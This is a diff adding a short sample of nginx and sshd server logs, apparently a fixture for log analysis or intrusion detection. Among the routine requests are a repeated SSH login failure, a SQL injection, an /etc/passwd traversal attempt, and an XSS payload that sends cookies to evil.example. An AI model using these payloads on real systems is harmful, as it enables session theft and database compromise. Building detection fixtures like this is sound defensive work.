@@ -1,0 +1,10 @@
+Jan 24 09:41:12 web-01 nginx: 203.0.113.44 - - "GET /index.html HTTP/1.1" 200 1024
+Jan 24 09:42:03 web-01 nginx: 203.0.113.44 - - "GET /assets/app.js HTTP/1.1" 200 5321
+Jan 24 10:15:03 auth-server sshd[1234]: Failed password for admin from 192.168.1.105 port 54321 ssh2
+Jan 24 10:15:05 auth-server sshd[1234]: Failed password for admin from 192.168.1.105 port 54322 ssh2
+Jan 24 10:15:07 auth-server sshd[1234]: Failed password for admin from 192.168.1.105 port 54323 ssh2
+Jan 24 11:02:47 web-01 nginx: 198.51.100.23 - - "GET /products?id=1 UNION SELECT username,password FROM users-- HTTP/1.1" 500 89
+Jan 24 11:14:19 web-01 nginx: 198.51.100.23 - - "POST /comments HTTP/1.1" 200 44 body="<script>document.location='https://evil.example/steal?c='+document.cookie</script>"
+Jan 24 11:29:58 web-01 nginx: 45.33.10.7 - - "GET /../../../../etc/passwd HTTP/1.1" 403 12
+Jan 24 12:05:31 auth-server sshd[5678]: Accepted password for deploy from 10.0.0.12 port 22 ssh2
+Jan 24 12:41:00 web-01 nginx: 203.0.113.44 - - "GET /favicon.ico HTTP/1.1" 200 512
